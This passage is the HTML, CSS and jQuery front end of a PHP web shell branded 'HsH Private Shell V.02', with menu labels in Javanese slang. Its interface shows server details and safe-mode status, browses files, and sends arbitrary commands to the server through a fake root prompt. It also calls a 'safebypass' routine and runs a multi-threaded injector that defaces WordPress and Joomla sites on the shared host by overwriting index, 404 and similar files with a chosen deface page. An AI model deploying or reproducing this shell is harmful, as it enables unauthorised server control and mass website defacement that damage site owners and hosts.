border: 1px solid #28FE14;
padding:10px;
}
.smit{
background-color: black;
color: #28FE14;
}
.sshbox{
display:none;
padding-left:7px;
width:600px;
height:400px;
margin: auto;
margin-top:80px;
-webkit-border-radius: 10px;
-moz-border-radius: 10px;
border-radius: 10px;
border:3px solid aqua;
background-color:#080500;
overflow:auto;
}
#sshcmd{
width:450px;
background-color: #080500;
color:#28FE14;
border:none;
}

</style>
<body>
<div class="logo" id="logo"></div>
<div id="sysinfo"><strong>OS:</strong> ';echo php_uname("s")." - ".php_uname("r")." /  ".php_uname("m");;echo '</div>

<div id="phpinfo"> ';
$srvsoft = explode(" ",$_SERVER['SERVER_SOFTWARE']);
echo $srvsoft[0];
echo " PHP ".phpversion();
if( ini_get('safe_mode') ){
echo " <font color='red'>Safe Mode On</font>";
}else{
echo " <font color='pink'>Safe Mode Off</font>";
}
;echo '</div>

<div id="tbl" class="tbl" style="display:none;">
<div class="filetable">
<div class="tblcnt" style="width:220px;">Name</div>
<div class="tblcnt" style="width:80px;">Size</div>
<div class="tblcnt" style="width:100px;">Modify</div>
<div class="tblcnt" style="width:100px;">Owner</div>
<div class="tblcnt" style="width:100px;">Permission</div>
<div class="tblcnt" style="width:80px;">Action</div>
</div>
<div id="filest"></div>
<div style="clear:both;"></div>

</div>

<div id="inject" class="tbl" style="display:none;">
<div class="filetable">
<div class="tblcnt" style="width:200px; cursor:pointer;" onClick="doSlct();">User</div>
<div class="tblcnt" style="width:220px;">Sitename</div>
<div class="tblcnt" style="width:160px;">CMS</div>
<div class="tblcnt" style="width:120px;">Status</div>
</div>
<div id="injtbl"></div>
<div style="clear:both;"></div>

</div>

<div id="infobox" style="display:none;"><div class="infotitle"><a href="" onclick="$(\'#infobox\').hide();return false;" style="color:black;">[-]</a> <span id="infotitle">Information</span></div><div class="infotxt" id="infotxt"></div></div>
<script>

var sidebar = false;
var sidebar2 = false;
function sidebarz(){
$(\'#logo\').hide();
if(sidebar){
$(\'#smnu\').hide();
sidebar = false;
}else{
$(\'#smnu\').show();
sidebar = true;
}
}
function sidebarz2(){
if(sidebar2){
$(\'#smnu2\').hide();
sidebar2 = false;
}else{
$(\'#smnu2\').show();
sidebar2 = true;
}
}

function filebrs(val){
hideAll();
$(\'#status\').html(\'Entenano Disek Yo Cox...\');
$.post("", { ac: "browse", path: val},
function(data) {
$(\'#tbl\').show();
$(\'#status\').html(\'Status: Wes Completed Cox ^_^\');
 $(\'#filest\').html(data);
});
}
function doUpdt(val){
 var refreshId = setInterval(function() {
      $("#injtbl").load(\'rootinject.tmp\');
   }, 5000);
   $.ajaxSetup({ cache: false });

hideAll();
$(\'#inject\').show();
$(\'#status\').html(\'Entenano Disek Yo Cox...\');
$.post("", { ac: val},
function(data) {
refreshId = "";
$(\'#sidebar2\').show();
$(\'#status\').html(\'Status: Wes Completed Cox ^_^\');
 $(\'#injtbl\').html(data);
});

}

function hideAll(){
k1 = 0;
k2 = 0;
$(\'#sidebar2\').hide();
$(\'#tbl\').hide();
$(\'#inject\').hide();
$(\'#infobox\').hide();
$(\'#sshbox\').hide();
}

function doReq(val){
hideAll();
$(\'#inject\').show();
$(\'#status\').html(\'Entenano Disek Yo Cox...\');
$.post("", { ac: val},
function(data) {
$(\'#sidebar2\').show();
$(\'#status\').html(\'Status: Wes Completed Cox ^_^\');
 $(\'#injtbl\').html(data);
});
}

function doReq2(val){
hideAll();
$(\'#status\').html(\'Entenano Disek Yo Cox...\');
$.post("", { ac: val},
function(data) {
$(\'#infobox\').show();
$(\'#status\').html(\'Status: Wes Completed Cox ^_^\');
 $(\'#infotxt\').html(data);
});
}

//Js Multi thread post request by Elo ^_^
var k1 = 1; var k2 = 0; var req_limit = 9;
function doInject(){
var i = 0; var j = 0;
$(\'.conf\').each(function(){
i += 1;
var id = $(this).attr(\'title\');

if(id > k1){ 
j += 1; k1 += 1;
var link = $(this).attr(\'href\');

var domain = $(\'#inj_dom\' + id).html();
var cms = $(this).html();
doPost2(link,cms,id,domain);
}
if(j > req_limit){return false;}


});
}



function doPost2(link,cmz,id,dmn){
if($(\'#injchk\'+id).is(\':checked\')){
$(\'#inj_status\' + id).html(\'Injecting...\');
$.ajax({
  url: "",
  type: "POST",
  timeout: 60000,
  data: {ac: "inject", conf: link, domain: dmn, cms: cmz, ignore_def: $(\'#ignore_def:checked\').val(), n404_php: $(\'#404_php:checked\').val(), nindex_php: $(\'#index_php:checked\').val(), nhome_php: $(\'#home_php:checked\').val(), narchive_php: $(\'#archive_php:checked\').val(), ncomment_php: $(\'#comment_php:checked\').val(), com_install: $(\'#use_com:checked\').val(), deface_page: $(\'#deface_page\').val()},
  dataType: "text"
}).done(function(msg) {

k2 += 1;

$(\'#inj_status\' + id).html(\'Parse Error\');
$(\'#inj_status\' + id).css({"background-color" : "red", "color" : "#8a00ff"});
var res_data = JSON.parse(msg);

if(res_data.status == "success"){
$(\'#inj_domain\' + id).html(\'<a class="injwork" href="\' + res_data.site + \'">\' + res_data.site + \'</a>\');
$(\'#inj_status\' + id).css({"background-color" : "green", "color" : "#8a00ff"});
$(\'#inj_status\' + id).html(\'Success\');
$(\'#injst\' + id).removeClass("conf");

}
else{
if(res_data.status == "error"){
$(\'#inj_status\' + id).css({"background-color" : "red", "color" : "#8a00ff"});
$(\'#inj_status\' + id).html(res_data.msg);
$(\'#inj_status\' + id).addClass("injerror");
$(\'#injst\' + id).removeClass("conf");
}else{
$(\'#inj_status\' + id).addClass("injerror");
$(\'#inj_status\' + id).html(\'Unknown\');
$(\'#injst\' + id).removeClass("conf");
}
}
updateInjSts(k2);
if(k1 == k2){doInject();}
}).fail(function(jqXHR, textStatus) {
k2 += 1;
$(\'#inj_status\' + id).css({"background-color" : "black", "color" : "#8a00ff"});
$(\'#inj_status\' + id).html(\'Timeout\');
updateInjSts(k2);
 if(k1 == k2){doInject();} 
});

}else{
k2 += 1;
updateInjSts(k2);
if(k1 == k2){doInject();} 
}
}
//Js Multi thread post request by Elo ^_^
function updateInjSts(k){
var tc = $(\'#sitecount\').val();
if(tc > k){
$(\'#status\').html("Status: " + k + "/" + tc + " Injected");
}else{
$(\'#status\').html("Status: Injection Complete ^_^");
}
}

function rmvErr(){
$(\'.injerror\').each(function(){
var nano = $(this).parent();
$(nano).remove();
});
}

function rmvSlct(){
$(\'.conf\').each(function(){
var id = $(this).attr(\'title\');
if($(\'#injchk\'+id).is(\':checked\')){
$(\'#inj\' + id).remove();
}
});
}

function retryTimeout(){
k1 = 1; k2 = 0;
doInject();
}

function doSlct(){
$(\'.conf\').each(function(){
var id = $(this).attr(\'title\');
doToggle(id);
});
}

function doToggle(dd){
if($(\'#injchk\'+dd).is(\':checked\')){
$(\'#injc\'+dd).css(\'background-color\',\'red\');
$(\'#injchk\'+dd).attr(\'checked\',false);
}else{
$(\'#injc\'+dd).css(\'background-color\',\'#660099\');
$(\'#injchk\'+dd).attr(\'checked\',true);
}
}

function doSSH(){
$(\'#status\').html("Entenano Disek Yo Cox...");
var cmd = $(\'#sshcmd\').val();
$(\'#sshcmd\').val("");
$.post("", { ac: "ssh",command: cmd},
function(data) {
$(\'#sshoutput\').append("[root@HsH~]# <br />"+data+"<br />");
$(\'#status\').html("Status: Done.");
});
}
</script>

<div class="sshbox" id="sshbox">
<br />
<div id="sshoutput"></div>
[root@HsH~]# <input onkeydown="if (event.keyCode == 13) doSSH();" type="text" id="sshcmd">
</div>

<div id="sidebar" class="sidebar">

<div class="smnu" id="smnu" class="smnu">
&raquo; <a href="" onClick="$(\'#infobox\').show();$(\'#infotitle\').html(\'Security Satpam \');doReq2(\'secinfo\');return false;">Security Satpam </a></br>
&raquo; <a href="" onClick="$(\'#infobox\').show();$(\'#infotitle\').html(\'Alamat & KTP \');doReq2(\'sysinfo\');return false;">Alamat & KTP </a></br>
&raquo; <a href="" onClick="$(\'#infotitle\').html(\'PHP Info\');doReq2(\'phpinfo\');return false;">Kelurahan & RT / RW </a></br>
&raquo; <a href="" onClick="filebrs(\'\'); return false;"> Mlebu Omah  </a></br>
&raquo; <a href="" onClick="$(\'#infotitle\').html(\'Scanned Domains\');doReq2(\'chknamed\');return false;"> Ngetokne Isi Sempak</a></br>
&raquo; <a href="" onClick="doReq(\'chkph\');return false;">Ngecrot Biyasa</a></br>
&raquo; <a href="" onClick="$(\'#inject\').show();doUpdt(\'chkph2\');return false;">Ngecrot Langsung</a></br>
&raquo; <a href="" onClick="doReq2(\'safebypass\');return false;"> Bypass Krian </a></br>
&raquo; <a href="" onClick="hideAll(); $(\'#sshbox\').show(); return false;"> Ngobrol </a></br>
&raquo; <a href="?ac=killme">Metu </a></br>

</div>
<div class="stitle" onClick="sidebarz();">*</br>S</br>L</br>O</br>R</br>O</br>K</br>A</br>N</br>*</div>
</div>

<div id="sidebar2" class="sidebar" style="display:none;right:1px;left:auto;">
<div class="smnu" style="float:right;" id="smnu2" class="smnu">
<div id="injmain">
&raquo; <a href="" onClick="doInject(); return false;">Tonyoni Kabeh </a></br>
&raquo; <a href="" onClick="">Ngirem</a></br>
&raquo; <a href="" onClick="rmvErr(); return false;">Busek Singrusak </a></br>
&raquo; <a href="" onClick="rmvSlct(); return false;">Busek Mileh </a></br>
&raquo; <a href="" onClick="retryTimeout(); return false;">Tonyoni Maneh </a></br>
&raquo; <a href="" onClick="$(\'#injmain\').hide(); $(\'#inj2nd\').show(); return false;">Setelan galau </a></br>
</div>
<div id="inj2nd" style="display:none;">
<div class="rbox">

<div style="clear:both;"></div>
<center><u>WordPress</u></center><br>
<input type="checkbox" name="x_php" id="x_php" checked>x.php<br />
<input type="checkbox" name="HsH_html" id="HsH_html" checked>HsH.html<br />
<input type="checkbox" name="404_php" id="404_php" checked>404.php<br />
<input type="checkbox" name="archive_php" id="archive_php" checked>archive.php<br />
<input type="checkbox" name="index_php" id="index_php" checked>index.php<br />
<input type="checkbox" name="index_html" id="index_html" checked>index.html<br />
<input type="checkbox" name="index_htm" id="index_htm" checked>index.htm<br />
<input type="checkbox" name="home_php" id="home_php" checked>home.php<br />
<input type="checkbox" name="comment_php" id="comment_php" checked>comment.php<br /><br /><br />
</div>

<div class="rbox">
<center><u>Joomla</u></center><br>
<input type="checkbox" name="use_com" id="use_com" checked>Use Com Installer<br />
<input type="checkbox" id="ignore_def">Ignore Default Templete<br />
<input type="checkbox" name="index_php" id="index_php" checked>index.php<br />
<input type="checkbox" name="index_html" id="index_html" checked>index.html<br />
<input type="checkbox" name="index_htm" id="index_htm" checked>index.htm<br />
<input type="checkbox" name="x_php" id="x_php" checked>x.php<br />
<input type="checkbox" name="HsH_html" id="HsH_html" checked>HsH.html<br />
</div>

<div class="rbox">
<center><u>Default</u></center><br>
Req/s: <input type="text" class="smit" value="10" onChange="req_limit = $(this).val();"><br />
Deface Page Link: <input type="text" class="smit" id="deface_page" value="http://linkdefacemu.cox/"><br /><br />
</div>

<div style="clear:both;"></div><br />
<a href="" onClick="$(\'#injmain\').show(); $(\'#inj2nd\').hide(); return false;"> Dalane Metu </a>
</div>


</div>
<div class="stitle" style="float:right;" onClick="sidebarz2();"> # </br>G</br>A</br>S</br>A</br>K</div>
</div>

<div style="clear:both;"></div>

<div id="status">Status: Saya Lagi Galau...</div>
<div class="copyright">HsH Private Shell V.02 </br> <a href=" http://googel-indonesia.blogspot.com/ "><font color="red">&copy; By Hacker Sakit Hati 2013 </font></a></div>
</body>
</html>';
?>
